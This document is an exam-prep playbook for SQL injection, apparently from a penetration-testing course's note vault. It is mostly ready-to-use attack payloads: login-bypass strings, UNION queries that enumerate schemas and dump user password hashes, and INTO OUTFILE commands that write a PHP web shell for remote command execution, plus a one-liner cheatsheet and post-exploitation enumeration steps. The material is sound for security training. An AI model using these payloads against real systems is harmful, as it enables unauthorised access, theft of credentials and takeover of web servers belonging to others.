# NOTE — SQL Injection Fundamentals (Exam Playbook)

## ID
535

## Module
SQL Injection Fundamentals

## Kind
methodology

## Title
SQL Injection Fundamentals — Full Exploitation Methodology

## Description
Exam-ready playbook for exploiting SQL injection vulnerabilities: detection & validation → logic bypass (authentication) → in-band data extraction (union injection) → privilege discovery → RCE via file write. Decision tree + commands from vault notes.

## Tags
methodology, sql-injection, union-injection, authentication-bypass, database-enumeration, file-write, rce, exam, decision-tree, cheatsheet

---

## TL;DR — The 5-Phase Flow

1. **Detect & validate injection** — single quote or comment syntax; confirm with error or logic bypass.
2. **Bypass authentication** — OR-based or comment-based payload to login without credentials.
3. **Extract database structure** — UNION injection to dump INFORMATION_SCHEMA, find sensitive tables.
4. **Dump sensitive data** — credentials, API keys, secrets from discovered tables.
5. **Escalate to RCE** — write PHP shell via `INTO OUTFILE` if DB user has FILE privilege.

> **Golden rule:** Always test for injection first with a **single quote** (`'`) — a SQL syntax error = injectability confirmed. Then pick your attack vector (OR, comments, UNION) based on what you control.

> **OPSEC fork:** if the application **filters single quotes**, try **double quotes** (`"`), **semicolons** (`;`), **parentheses** (`)`) or **comments** (`#`, `-- -`) to detect injection. Some apps block quotes but not comments. And: **always check `secure_file_priv` before attempting RCE** — it's empty on MariaDB (writable) but restricted on MySQL (usually `/var/lib/mysql-files`).

---

## Phase 1 — Detect & Validate Injection

**You have:** web form, parameter, or API endpoint.  
**Goal:** confirm the input reaches the database and is vulnerable to SQLi.

| Trigger / Precondition | What you see | Next step |
|---|---|---|
| Form with text input (login, search, filter) | Page displays user input or searches based on it | Test injection in that field |
| API endpoint with `?id=` or `?search=` query param | API returns structured data (JSON/XML) based on the param | Test the query param |
| Error message shows database name or query fragment | Page leaks database type (MySQL, MSSQL, etc.) | Confirm SQLi type (error-based, union, blind) |
| No visible feedback (blind form) | Form always shows same output regardless of input | Use time-based or boolean-based blind techniques |

### Detection workflow

```bash
# 1. Test for basic SQLi with a single quote
# Input: ' 
# Expected: SQL syntax error OR app behavior change

# 2. If no error, try comment-based test
# Input: admin'-- -
# Expected: Bypass auth, or blank error (comment worked)

# 3. If no error, try parentheses
# Input: ')-- -
# Expected: Closing paren + comment = valid syntax now

# 4. If still nothing, try UNION-based test
# Input: ' UNION select 1-- -
# Expected: Error about column mismatch (UNION needs same column count)
# That error = proof of injection

# 5. If database type unclear, inject version functions
# Input: ' UNION select @@version-- -
# Output: MySQL 5.7.x or 8.0.x, MariaDB 10.x
```

**Output checkpoint:** You have confirmed:
- The parameter is injectable (you got a SQL error, logic bypass, or version string).
- The database type (MySQL, MariaDB, MSSQL, PostgreSQL).
- The injection point is in a data context (string literal `'...value...'`).

---

## Phase 2 — Bypass Authentication (OR & Comment Techniques)

**You have:** injectable login form.  
**Pick branch by payload structure:**

### 2.A — OR-based bypass (target specific user)

**When:** you know a valid username or just want to login as anyone.

```bash
# 1. Test with OR in the USERNAME field
# Input: tom' or '1'='1
# Query becomes: SELECT * FROM users WHERE username='tom' or '1'='1' AND password='anything'
# Evaluation: username='tom' OR ('1'='1' AND password=<false>) → TRUE (tom's row)
# Password: anything
# Result: Logs in as tom

# 2. If no known user, OR in both fields
# Username: ' or '1'='1
# Password: ' or '1'='1
# Query: WHERE username='' or '1'='1' AND password='' or '1'='1'
# Result: Logs in as first user (usually admin)

# 3. Targeting by ID (if ID parameter exists)
# Input: 1' or '1'='1
# Or: 1 or 1=1  (numeric context, no quotes needed)
```

**Critical:** AND evaluates before OR, so the query structure is:

```
username='X' or '1'='1' AND password='Y'
= (username='X') OR ('1'='1' AND password='Y')
= (username='X') OR (TRUE AND password='Y')
= (username='X') OR (FALSE if password wrong)
= TRUE if X exists
```

### 2.B — Comment-based bypass (all users, any password)

**When:** OR approach fails or you want to ignore the password entirely.

```bash
# 1. Close the string with a quote, then comment
# Username: admin'-- -
# Password: anything
# Query: WHERE username='admin'-- - AND password=...
# Result: Only sees username='admin', comment kills password check

# 2. With parentheses
# Username: admin')-- -
# Password: anything
# Query: WHERE (username='admin')-- - AND password=...
# Closes the paren, then comments

# 3. Using # (URL-encode as %23)
# Username: admin%23
# Password: anything
# Query: WHERE username='admin'# AND password=...
# Result: Same as --, comment kills password
```

**Always test both `'` and `)` variants** — if the original query wraps conditions in parentheses, you need the closing paren.

**Output checkpoint:** You are logged in as a known user. Next: dump the database structure.

---

## Phase 3 — Extract Database Structure (UNION Injection)

**You have:** confirmed injection + logged-in session (optional) OR a search/parameter that displays results.  
**Goal:** discover columns, detect data types, enumerate databases and tables.

### 3.A — Detect column count (ORDER BY method)

```bash
# 1. Inject ORDER BY with increasing numbers
# Input: ' order by 1-- -
# No error? Try 2.
# Input: ' order by 2-- -
# No error? Try 3.
# ...
# Input: ' order by 5-- -
# ERROR: Unknown column '5' in 'order clause'
# Result: Last successful = 4 columns

# 2. Alternative: UNION method (add columns until it works)
# Input: ' UNION select 1-- -
# ERROR: The used SELECT statement has a different number of columns
# Input: ' UNION select 1,2-- -
# ERROR: Still 2 columns (original has 3 or more)
# Input: ' UNION select 1,2,3,4-- -
# SUCCESS: 4 matches original query, or error says "4 in all SELECT statements"
# Result: Original query has 4 columns
```

### 3.B — Identify visible columns

```bash
# 1. Once you know column count (say 4), inject all numbers
# Input: ' UNION select 1,2,3,4-- -
# Page shows: "1" in field A, "2" in field B, blank for field C, "4" in field D
# Result: columns 1, 2, 4 are visible (inject payloads here)

# 2. Test data types
# Input: ' UNION select 'A',2,3,4-- -
# If column 1 is numeric only, this errors
# Input: ' UNION select 1,'text',3,4-- -
# If column 2 can hold text, this succeeds

# 3. Find the database name and version
# Input: ' UNION select 1,database(),@@version,4-- -
# Output shows current DB + MySQL version in visible columns
```

**Output checkpoint:** You know:
- Column count of the original query.
- Which columns are displayed on the page.
- Data types of each column.

---

## Phase 4 — Enumerate & Dump Sensitive Data

**You have:** UNION injection working + known visible columns.  
**Goal:** discover all databases, tables, columns, then dump credentials/secrets.

### 4.A — List all databases

```bash
# Query: INFORMATION_SCHEMA.SCHEMATA contains all databases
# Input: ' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
# Output: mysql, information_schema, performance_schema, sys, wordpress, dev_db, customers
# Filter: Ignore default DBs (mysql, info_schema, perf_schema, sys)
# Targets: wordpress, dev_db, customers (custom/app-specific)
```

### 4.B — Find current database

```bash
# Input: ' UNION select 1,database(),3,4-- -
# Output: wordpress
# Reason: Tells you which DB the app is querying (for relative table references)
```

### 4.C — List all tables in target database

```bash
# Input: ' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='wordpress'-- -
# Output: wp_users, wp_posts, wp_postmeta, wp_options, wp_comments
# Filter: Look for users, credentials, config, secrets (wp_users, wp_options)
```

### 4.D — List all columns in a juicy table

```bash
# Input: ' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='wp_users'-- -
# Output: ID, user_login, user_email, user_pass, user_registered
# Look for: password, pass, secret, key, token, api_key, credit_card
```

### 4.E — Dump the data

```bash
# Syntax: ' UNION select col1,col2,col3,col4 from <DATABASE>.<TABLE>-- -
# Example: ' UNION select 1,user_login,user_pass,4 from wordpress.wp_users-- -
# Output: admin | $P$BfhZZr...hash | editor | $P$Bf27Zr...hash

# Important: Use dot notation (database.table) if querying a different DB than current
# Example: ' UNION select 1,col from dev_db.credentials-- -
```

**Output checkpoint:** You have dumped:
- Usernames and password hashes (crack offline with hashcat/john).
- API keys and tokens (use directly).
- Configuration secrets (for lateral movement).

---

## Phase 5 — Escalate to Remote Code Execution (File Write)

**You have:** confirmed FILE privilege + empty `secure_file_priv` (from Phase 4 enumeration).  
**Goal:** write a web shell to the webroot for command execution.

### 5.A — Verify FILE privilege (done in Phase 4)

```bash
# Enumeration query:
# ' UNION select 1,GRANTEE,PRIVILEGE_TYPE,4 from information_schema.USER_PRIVILEGES where PRIVILEGE_TYPE='FILE'-- -
# Output: 'user'@'localhost' | FILE
# Result: FILE privilege present (proceed to 5.B)

# Alternative: Check all privileges
# ' UNION select 1,GRANTEE,PRIVILEGE_TYPE,4 from information_schema.USER_PRIVILEGES where GRANTEE="'root'@'localhost'"-- -
```

### 5.B — Check secure_file_priv setting

```bash
# Input: ' UNION select 1,variable_name,variable_value,4 from information_schema.global_variables where variable_name='secure_file_priv'-- -
# Output: 'secure_file_priv' | NULL or '/var/lib/mysql-files' or ''
# Interpretation:
#   - Empty string ('') = can write anywhere (MariaDB default)
#   - NULL = no file writes allowed
#   - '/path' = can only write to that directory
```

### 5.C — Detect webroot

```bash
# Test common paths: /var/www/html, /usr/share/nginx/html, /home/user/public_html
# Try writing a test file:
# ' UNION select 1,'test',3,4 into outfile '/var/www/html/test.txt'-- -
# Then browse to http://target/test.txt
# If file appears → that's the webroot

# Alternative: Use LOAD_FILE to read common config files
# ' UNION select 1,LOAD_FILE('/var/www/html/index.php'),3,4-- -
# If you see PHP source, that's the webroot
```

### 5.D — Write a web shell

```bash
# 1. Simple PHP shell (one-liner)
# ' union select "",'<?php system($_REQUEST[0]); ?>',"";"" into outfile '/var/www/html/shell.php'-- -
# Use empty strings ("") instead of numbers to avoid junk in output

# 2. Alternative: More features
# ' union select "",'<?php if(isset($_POST[0])){echo "<pre>";system($_POST[0]);echo "</pre>";}?>',"";"" into outfile '/var/www/html/shell.php'-- -

# 3. Test the shell
# GET: http://target/shell.php?0=id
# Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)
# Result: RCE confirmed as www-data
```

### 5.E — Enumerate & escalate from www-data

```bash
# Once you have RCE, enumerate for privilege escalation:
# - sudo -l (can www-data run sudo?)
# - Check /etc/passwd for other users
# - Find SUID binaries: find / -perm -4000 2>/dev/null
# - Check running services
# - Look for credentials in .bash_history, .ssh, config files

# If no privilege escalation, you still have:
# - Read/write web files
# - Access to database (if creds found)
# - Potential for lateral movement (creds → SSH/RDP)
```

**Output checkpoint:** You have remote code execution on the web server as www-data. Next: escalate privileges or pivot.

---

## Decision Tree (Under Exam Pressure)

```
You have an SQLi vulnerability:

├── Got a SQL error message?
│   ├── YES (shows column, table name, etc.)
│   │   ├── Error-based injection
│   │   ├── Extract data from error messages directly (less reliable)
│   │   └── Or: Use UNION to extract more cleanly
│   └── NO, page just behaves differently
│       ├── Could be blind SQLi (true/false responses)
│       └── Or: UNION injection (no errors, just outputs)
│
├── Can you see the output of your injected queries?
│   ├── YES (numbers appear on page, results display)
│   │   ├── UNION injection → Phase 3 (detect columns)
│   │   └── Dump database structure + data
│   ├── NO (page same regardless of injection)
│   │   ├── Blind SQLi → use time-based (SLEEP(5)) or boolean-based (IF/CASE)
│   │   └── Char-by-char extraction (slow, not exam priority)
│   └── Only difference is login success/failure
│       ├── OR / comment injection → Phase 2 (bypass auth)
│       └── Dump credentials from usernames you find
│
├── What privileges does the DB user have?
│   ├── FILE privilege + empty secure_file_priv
│   │   ├── Phase 5: Write web shell → RCE
│   │   └── Find privilege escalation on host
│   ├── FILE privilege but restricted secure_file_priv
│   │   └── Can't write to webroot, pivot differently
│   ├── No FILE privilege
│   │   ├── Extract all data you can (users, configs)
│   │   └── Look for credentials → SSH / RDP lateral move
│   └── Unsure → Enumerate information_schema.USER_PRIVILEGES
│
└── STUCK > 20 min
    ├── Re-check column count (ORDER BY method more reliable)
    ├── Try different comment styles (-- -, --, #, %23)
    ├── Check for filtered characters (quotes, semicolons, space)
    │   └── Try: %20 (space), /**/  (space), UNION/**/SELECT
    └── If blind, try SLEEP(5) for timing-based confirmation
```

---

## Signal → Counter-Move Reference

| You see / observe | Likely cause | Counter-move |
|---|---|---|
| Input 1' returns SQL syntax error | Injection confirmed, single quote works | Proceed to Phase 2 or 3 depending on context |
| Single quote filtered, but page works unchanged | Comment-based injection may work | Try `admin'-- -`, `admin')-- -`, or `#` |
| `ORDER BY 5` succeeds but `ORDER BY 6` errors | Column count is 5 | Use `UNION select 1,2,3,4,5` |
| `UNION select 1,2,3` errors "column count mismatch" | Original query has >3 columns | Keep adding: 4, 5, 6... until it works |
| `UNION select` succeeds but nothing displays | Columns exist but aren't rendered | Inject payload into the displayed column positions from Phase 3.B |
| `database()` returns empty string | Current DB unknown or not set | Try `SELECT * FROM information_schema.SCHEMATA` instead |
| INFORMATION_SCHEMA.TABLES query returns no rows | Table names are case-sensitive on Linux | Use `SHOW TABLES FROM <dbname>` (if allowed) or try lowercase |
| `INTO OUTFILE` fails with "file already exists" | Tried to overwrite a file | Delete the file first or use a new filename |
| Shell written but HTTP 404 when browsing to it | File in wrong directory or permission denied | Re-check webroot with LOAD_FILE, verify write permissions |
| `shell.php?0=id` returns blank | Shell syntax error or PHP disabled | Test with `?0=echo%20test`, check PHP version & safe_mode |
| DB user lacks FILE privilege | Not a root user, restricted permissions | Extract data only, look for credentials for lateral move |
| `secure_file_priv` shows '/var/lib/mysql-files' | Restricted to MySQL's own directory, can't hit webroot | Pivot: find credentials, SSH/RDP, or data extraction only |
| Multiple databases exist, unsure which to dump | App likely uses only one, others are system dbs | Query `information_schema.TABLE_SCHEMA` from the app's tables, or try: mysql, wordpress, app, dev |
| Credentials cracked but no clear privilege escalation | Host is hardened | Use creds for: SSH lateral move, application admin panel, database admin access |

---

## Master Cheatsheet — One-Liners by Scenario

```bash
# === Scenario 1: Detect SQLi in login form ===
# Input: ' in username field
# Expected: SQL error or unexpected behavior
# Confirms: injectability

# === Scenario 2: Bypass login with OR ===
# Username: tom' or '1'='1
# Password: anything
# Result: Logs in as tom

# === Scenario 3: Bypass login with comments ===
# Username: admin'-- -
# Password: anything
# Result: Password check ignored, logs in as admin

# === Scenario 4: Detect column count (ORDER BY) ===
# Input: ' order by 1-- -
# Increment number until error: that's column count

# === Scenario 5: Test UNION injection ===
# Input: ' UNION select 1,2,3,4-- -
# Shows: 1 in col1, 2 in col2, blank in col3, 4 in col4
# Next: Put payload in visible columns (e.g., col2)

# === Scenario 6: Dump current DB + version ===
# Input: ' UNION select 1,database(),@@version,4-- -
# Output: Current database name + MySQL version

# === Scenario 7: List all databases ===
# Input: ' UNION select 1,schema_name,3,4 from information_schema.SCHEMATA-- -
# Output: All databases on the server

# === Scenario 8: List tables in target DB ===
# Input: ' UNION select 1,TABLE_NAME,3,4 from information_schema.TABLES where table_schema='wordpress'-- -
# Output: All tables in wordpress database

# === Scenario 9: List columns in target table ===
# Input: ' UNION select 1,COLUMN_NAME,TABLE_NAME,4 from information_schema.COLUMNS where table_name='wp_users'-- -
# Output: All columns in wp_users table

# === Scenario 10: Dump user credentials ===
# Input: ' UNION select 1,user_login,user_pass,4 from wordpress.wp_users-- -
# Output: admin | hash1, editor | hash2
# Next: hashcat to crack offline

# === Scenario 11: Find FILE privilege ===
# Input: ' UNION select 1,GRANTEE,PRIVILEGE_TYPE,4 from information_schema.USER_PRIVILEGES where PRIVILEGE_TYPE='FILE'-- -
# Result: If present, can attempt file write

# === Scenario 12: Check secure_file_priv ===
# Input: ' UNION select 1,variable_name,variable_value,4 from information_schema.global_variables where variable_name='secure_file_priv'-- -
# Result: Empty = anywhere, NULL = nowhere, /path = restricted

# === Scenario 13: Write test file ===
# Input: ' UNION select 1,'success',3,4 into outfile '/var/www/html/test.txt'-- -
# Then: GET http://target/test.txt → confirms webroot & write access

# === Scenario 14: Write PHP shell ===
# Input: ' UNION select "",'<?php system($_REQUEST[0]); ?>','',''" into outfile '/var/www/html/shell.php'-- -
# Then: GET http://target/shell.php?0=id → RCE

# === Scenario 15: Execute command via shell ===
# GET: http://target/shell.php?0=cat%20/flag.txt
# Output: Flag content
```

---

## Quick Reference — Techniques by Goal

| Goal | Technique | When to use | Commands |
|---|---|---|---|
| **Detect injection** | Single quote test | Entry point discovery | `'`, `"`, `)`, comment syntax |
| **Bypass login** | OR injection | You know a username | `admin' or '1'='1` |
| **Bypass login** | Comment injection | Any user (first in table) | `admin'-- -`, `admin')-- -` |
| **Find column count** | ORDER BY | Before UNION exploit | `' order by N-- -` |
| **Find visible columns** | Number placeholders | Identify output positions | `' UNION select 1,2,3,4-- -` |
| **Enumerate structure** | INFORMATION_SCHEMA | Map databases & tables | `SCHEMATA`, `TABLES`, `COLUMNS` |
| **Dump data** | UNION SELECT | Extract credentials, secrets | `UNION select col1,col2 from table-- -` |
| **Get RCE** | INTO OUTFILE | Write PHP shell | `INTO OUTFILE '/var/www/html/shell.php'` |
| **Blind inference** | Time-based delay | No output visible | `SLEEP(5) IF(condition,1,0)` |
| **Blind inference** | Boolean comparison | True/false responses | `IF(1=1,'yes','no')` |

---

## Top Gotchas (These Burn Exam Time)

1. **Forgetting the space after `--` comment** — `--` alone is not valid in MySQL; must be `-- ` (with space) or `--+` or `--#`. Convention: use `-- -` to make space visible.

2. **OR operator precedence bite** — `username='admin' or username='tom' AND password='x'` evaluates as `(username='admin') OR (username='tom' AND password='x')`. If tom exists, you bypass login. Use parentheses carefully.

3. **UNION column count mismatch** — If the original query selects 4 columns but you union 3, it errors. Count first with ORDER BY, then construct UNION with exact match.

4. **Column not visible on page** — Just because your UNION works doesn't mean all columns render. Test with numbers (1,2,3,4) to identify which positions display. Inject your payload only there.

5. **INTO OUTFILE overwrites block** — You can't overwrite existing files. If `/proof.txt` exists, your INTO OUTFILE fails. Use a new filename or delete the old one first.

6. **secure_file_priv restrictions** — MariaDB defaults to empty (writeable anywhere). MySQL defaults to `/var/lib/mysql-files` (restricted). Some configs set NULL (no writes). Always check before attempting RCE.

7. **Webroot mismatch** — `/var/www/html/` is Apache, `/usr/share/nginx/html/` is Nginx. If you write to the wrong path, your shell won't execute. Use LOAD_FILE to check webroot config.

8. **Case sensitivity in INFORMATION_SCHEMA queries** — On Linux, table names are case-sensitive. `'wordpress'` ≠ `'WORDPRESS'`. Always use the exact case from the enumeration query.

9. **Special characters in payloads** — Spaces need `%20`, `&` needs `%26` in URLs. Shell commands with pipes or redirects need URL-encoding. Test in browser address bar first.

10. **Forgetting to close parentheses in injection** — If the original query has `WHERE (username=...)`, you must close the paren before your comment: `admin')-- -`, not `admin'-- -`. Mismatch = syntax error.

---

## Related Vault Notes

- [[01-intro]] — Foundation, why SQLi matters
- [[08-intro-to-sqli]] — Injection types (in-band, blind, out-of-band), syntax errors
- [[09-subverting-query-logic]] — OR-based authentication bypass
- [[10-using-comments]] — Comment-based authentication bypass
- [[11-union-clause]] — UNION syntax & logic
- [[12-union-injection]] — Practical UNION exploitation workflow
- [[13-database-enumeration]] — INFORMATION_SCHEMA queries for structure discovery
- [[15-writing-files]] — INTO OUTFILE & RCE via web shell
- [[16-mitigation]] — Defense perspectives, WAF detection, remediation

---

## Triage Backlink

**See:** `../ATTACK-PATHS.md` for how to route from specific web-app symptoms to SQL injection checks.
Example: You see `?search=` parameter → SQL injection common there → consult Phases 1–3.
